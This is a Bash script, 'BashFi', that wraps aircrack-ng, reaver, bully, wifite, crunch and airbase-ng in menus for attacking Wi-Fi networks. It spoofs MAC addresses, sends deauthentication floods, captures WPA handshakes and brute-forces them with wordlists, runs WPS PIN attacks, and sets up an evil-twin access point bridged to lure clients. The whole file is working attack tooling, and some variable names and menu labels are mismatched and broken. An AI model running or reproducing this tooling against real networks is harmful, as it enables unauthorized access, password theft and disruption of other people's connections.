#!/bin/bash 

clear
if [ $EUID -ne 0 ]; then
    sudo  "$0" "$@"
    exit $1
fi

figlet BashFi
sleep 1

echo "Welcome to BashFi"
echo "Select an interface: "

interfaces=`ip link | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2a;getline}'`
select interface in $interfaces; do
echo "$interface choosen."
echo "Enabling monitor mode on $interface."
sudo ifconfig $interface down
sudo macchanger -r $interface
sudo iwconfig $interface mode monitor
sudo ifconfig $interface up
clear
sleep 1 
#mainmenu
mainmenu="ChangeInterface Staging Scans Attacks"
select menu in $mainmenu; do
case $menu in

ChangeInterface)
clear
break
;;

#staging menu
Staging)
clear
staging="TestInjection ChangeMac ResetMac EnableMonMode EnableManMode ChangeChannel MainMenu Quit"
select option in $staging; do
case $option in

	#test packet injection
	TestInjection)
	clear
	echo "Testing injection"
	sudo aireplay-ng --test $interface
	echo "press enter to return"
	;;

	#spoof mac
	ChangeMac)
	clear
	echo "Changing Mac..."
	sudo macchanger -a $interface
	sudo macchanger -s $interface
	echo "press enter to refurn"
	;;

	#reset mac to OG
	ResetMac)
	clear
	echo "Resetting mac..."
	sudo macchanger -p $interface
	echo "press enter to return"
	;;

	#enable monitor mode
	EnableMonMode)
	clear
	echo "Enabling monitor mode..."
	sudo airmon-ng check kill
	sudo airmon-ng start $interface 
	echo "Monitor mode enabled on $interface."
	echo "press enter to return"
	;;

	#enable mangaed mode
	EnableManMode) 
	clear
	echo "Enabling managed mode"
	sudo airmon-ng stop $interface
	sudo service network-manager restart
	echo "Managed mode enabled on $interface"
	echo "press enter to return"
	;;

	#change channel
	ChangeChannel)
	clear
	read -p "Change channel to: " $channel
	sudo iwconfig $interface channel $channel 
	echo "Changed channel to $channel"
	echo "press enter to return"
	;;

	#back to main menu
	MainMenu)
	clear
	break
	;;

	Quit)
	clear
	echo "exiting"
	exit
	;;

	*)
	clear
	echo "invalid character"
	;;

    esac
    done
	;;

		#scans
		Scans)
		clear
		scans="Airodump-ngScan WPSscan MainMenu"
		select scan in $scans; do
		case $scan in

			Airodump-ngScan)
			clear
			read -p "Time to scan in secs: " time
			echo "scaning..."
			nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
			timeout $time xterm -hold -e sudo airodump-ng $interface
			;;

			WPSscan)
			clear
		   	read -p "Amount of time to scan for in secs: " time
           	echo "scanning..."
           	sleep 1
		   	nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
           	timeout $time xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
           	;;
	
			MainMenu)
			clear
			break
			;;

			*)
        	clear
        	echo "Invaild option!"
        	echo "press enter to return"
			;;

			esac
			done
			;;
				#attacks menu
				Attacks)
				clear
				echo "These attacks require monitor mode"
				attacks="Deauth WifiPasswordBruteforce WPS EvilTwin MainMenu"	
				select attack in $attacks; do
				case $attack in  

					MainMenu)
					break
					;;

					Deauth)
					clear
					read -p "Ammount to scan in secs: " timeout 
					nohup timeout $timeout xterm -hold -e termdown $timeout > /dev/null 2>&1 &
					timeout $timeout xterm -hold -e sudo airodump-ng $interface 
					read -p "Enter how many times to send deauth frame: " times
					read -p "Enter bssid of network: " bssid
					iwlist $interFace channel | grep Current
					read -p "Enter channel of bssid: " channel
					sudo iwconfig $interFace channel $channel
					xterm -hold -e sudo aireplay-ng -0 $times -a $bssid $interface
					;;

					WifiPasswordBruteforce)
					clear
					Attack_Options="Regex_Scan Regex_Capture Cap_BruteForce AttacksMenu"
    				select ption in $Attack_Options; do 
   					case $ption in

						AttacksMenu)
						clear
						break
						;;

				    	Regex_Scan)
						clear
						read -p "Time to scan in secs: " time
						echo "scaning..."			
						nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
						timeout $time xterm -hold -e sudo airodump-ng $interface
						;;

						Regex_Capture)
					    clear
						read -p "Time to scan in secs: " time 
						echo "Copy BSSID, station mac and channel from scan, press space to pause scan"
						nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
						timeout $time nohup xterm -hold -e sudo airodump-ng -M -W $option > /dev/null 2>&1 &
						read -p "BSSID to capture from: " BSSID
						read -p "Channel: " CHANNEL
						read -p "Station to deauth: " STATION
						read -p "Name for capture file: " FILE
						nohup xterm -hold -e sudo airodump-ng -c$CHANNEL -w $FILE -d $BSSID $interface > /dev/null 2>&1 &
						xterm -hold -e sudo aireplay-ng --deauth 0 -a $BSSID -c $STATION $interface
						;;

						Cap_BruteForce)
						clear
					    clear
						echo "Bruteforcing a handshake capture with aircrack-ng"
						Cracking_Options="Custom_Charset Crunch_Charset Wordlist_Brute PasswordMenu"
						select cracking_option in $Cracking_Options; do
						case $cracking_option in

							PasswordMenu)
							clear
							break
							;;

							Custom_Charset)
							clear
							echo "Make custom charsets with crunch"
							echo "Leave input blank and press enter for an uneeded option"
							read -p "Min length: " min
							read -p "Max length: " max
							echo "Crunch options:"
							echo "@=lower case letters ; ,=capital letters ; %=numbers ; ^=symbols"
							echo "Example options: @,%^possible password"
							read -p "Enter crunch options and possible password: " possible
							read -p "Enter own characters for custom charset: " custom
							read -p "Enter path of handshake capture: " path
							read -p "SSID: " ssid
							xterm -hold -e sudo crunch $min $max -t $possible $custom | sudo aircrack-ng -w - $path -e $ssid
							;;

							Crunch_Charset)
							clear
							echo "Use crunch charsets"
							read -p "Min length: " min
							read -p "Max length: " max
							echo "Crunch options:"
							echo "@=lower case letters ; ,=capital letters ; %=numbers ; ^=symbols"
							echo "Example options: @,%^possible password"
							read -p "Enter crunch options and possible password: " possible
							read -p "Enter path of handshake capture: " path
							read -p "ssid: " ssid
							xterm -hold -e sudo crunch $min $max -t $possible -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space |  sudo aircrack-ng -w - $path -e $ssid 
							;;

							Word_listBrute)
							clear
							echo "Bruteforce with wordlist"
							read -p "Enter path of handshake capture " path
							xterm -hold -e sudo aircrack-ng $path -w /usr/share/wordlists/rockyou.txt 
							;;

							PasswordMenu)
							clear
							break
							;;

					
						esac
						done
						;;
					

						esac
						done
						;;

					WPS)
					clear
					wps_options="Scan Pixie_Dust Null_Pin Wifite_Brute Bully_Brute Reaver_Brute_without_pixie AttacksMenu"   
					echo "Select an attack option"
					select wps_option in $wps_options; do
					case $wps_option in
						
					Scan) 
					clear
					read -p "Amount of time to scan for in secs: " time
					echo "scanning..."
					sleep 1
					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
					timeout $time xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
					;;
					
					Pixie_Dust)
					clear
					echo "For bruteforcing to stay stable, it recommended to associate with the target network"
					read -p "Amount of time to scan for in secs: " time
					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
					timeout $time nohup xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
					echo "close xterm before entering essid"
					read -p "enter bssid: " bssid
					read -p "enter essid: " essid
					read -p "Set delay in secs" delay
					sudo ifconfig $option down 
					sudo macchanger -p $option
					sudo ifconfig $option up
					sudo macchanger -s $option
					iwlist $option channel | grep Current
					read -p "Set same channel as target network: " channel
					sudo iwconfig $option channel $channel
					read -p "network card mac: " mac 
					sudo aireplay-ng -1 0 -e $essid -a $bssid -h $mac $option
					echo "Association complete, starting bruteforce..."
					sleep 1
					xterm -hold -e sudo reaver -c $channel -i $option -b $bssid -d$delay -vv -K 1
					;;
				
					Null_Pin)
					clear
					echo "Null pin attack is bruteforcing with no pin"
					read -p "Amount of time to scan for in secs: " time
					echo "scanning..."
					sleep 1
					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
					timeout $time xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
					iwlist $option channel | grep Current
					echo "close xterm before entering bssid"
					read -p "enter channel: " channel
					read -p "enter bssid:" bssid 
					
					xterm -hold -e sudo reaver -c $channel -i $interface -b $bssid -p "" -N
					;;

					Wifite_Brute)
					clear
					xterm -hold -e sudo wifite -i $interface -mac --wps
					;;

					Bully_Brute)		   
					clear
					read -p "Amount of time to scan for in secs: " time
					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
					timeout $time nohup xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
					echo "close xterm before entering essid"
					read -p "enter bssid: " bssid
					read -p "enter essid: " essid

					xterm -hold -e sudo bully $interface -b $bssid -e $essid
					;;

					Reaver_Brute_without_pixie)
					clear
					read -p "Amount of time to scan for in secs: " time
					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
					timeout $time nohup xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
					read -p "enter bssid: " bssid
					read -p "enter essid: " essid
					read -p "enter delay in secs: " delay

					xterm -hold -e sudo reaver -i $interface -b $bssid -e $essid -d$delay 
					;;
					
					AttacksMenu)
					clear
					break
					;;

					esac
					done
					;;

					#evil twin menu
					EvilTwin)
					clear
					options="ConfigBridges SkipConfig"
					select option in $options; do
					case $option in

						ConfigBridges)
						#bridge section
						echo "Before the attack, we need to make a bridge"
						read -p "Bridge name: " bridge
						brctl addbr $bridge
						echo "$bridge created"
						echo "Interface to bridge to: "
						Interfaces=`ip link | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2a;getline}'`
						select Interface in $Interfaces; do
						brctl addif $bridge $Interface
						break
						done
						break
						;;

						SkipConfig)
						brctl show
						read -p "Type name of bridge here: " bridge
						read -p "Type interface here: " Interface
						clear
					
						read -p "Time to scan in secs: " time
						echo "Scan is for setting up the AP"
						#timer xterm
						nohup timeout $time xterm -T "Timer" -n "Timer" -hold -e termdown $time > /dev/null 2>&1 &
						#airodump xterm
						nohup timeout $time xterm -hold -e sudo airodump-ng $interface > /dev/null 2>&1 &
						#fake ap 
						read -p "BSSID: " bssid
						read -p "ESSID: " essid
						read -p "Channel: " channel
						echo "Creating AP"
						#fake ap 
						nohup xterm -hold -e sudo airbase-ng -a $bssid -e $essid -c $channel $interface > /dev/null 2>&1 &
						echo "AP created successfully"
						sleep 3
						#bridge creation
						sudo brctl addif $bridge $Interface
						sudo brctl addif $bridge at0
						sudo ifconfig $Interface 0.0.0.0 up
						sudo ifconfig at0 0.0.0.0 up
						sudo ifconfig $bridge up
						#wait a bit on this command
						echo "wait 1 minute"
						sudo dhclient $bridge
						

						attacks="DeauthAll DeauthSingle Rescan RecreateAP AttacksMenu"
						select attack in $attacks; do
							case $attack in
							
							DeauthAll)
							clear
							#deauthing all of the real ap
								read -p "time to scan in secs: " time
							nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
							nohup timeout $time xterm -hold -e sudo airodump-ng $interface > /dev/null 2>&1 &
							read -p "BSSID: " bssid
							read -p "How many times to deauth: " times

							xterm -hold -e sudo aireplay-ng -0 $times -a $bssid $interface
							;;
							
							DeauthSingle)
							clear
							#deauthing one single station
							read -p "time to scan in secs: " time
							nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
							nohup timeout $time xterm -hold -e sudo airodump-ng $interface > /dev/null 2>&1 &
							read -p "How many times to deauth: " times
							read -p "BSSID: " bssid 
							read -p "Station mac: " station
							
							xterm -hold -e sudo aireplay-ng -0 $times -a $bssid -c $station $interface 
							;;

							Rescan)
							#for rescaning
							clear
							pkill xterm
							read -p "time to scan in secs: " time
								nohup timeout $time xterm -hold -e termdown $time > /dev/nul
								timeout $time xterm -hold -e sudo airodump-ng $interface
							;;

							RecreateAP)
							#for remaking the ap
							clear
							pkill xterm
							read -p "Time to scan in secs: " time
							#timer
							nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
							#scan
							nohup timeout $time xterm -hold -e sudo airodump-ng $interface > /dev/null 2>&1 &
							#AP input
							read -p "BSSID: " bssid
							read -p "ESSID: " essid
							read -p "Channel: " channel
							echo "Recreating AP"
							#makes AP
							nohup xterm -hold -e sudo airbase-ng -a $bssid -e $essid -c $channel $interface > /dev/null 2>&1 &
							;;

							AttacksMenu)
							#for changing the interface
							clear
							break
							;;

							*)
							echo "Invalid character!"
							sleep 1
							clear
							;;

						esac
						done
						;;

					esac
					done
					;;

					*)
					clear
					echo "invalid character"
					;;

							*)
							echo "invalid character"
							clear
							;;

					esac
					done
					;;
esac            
done
done
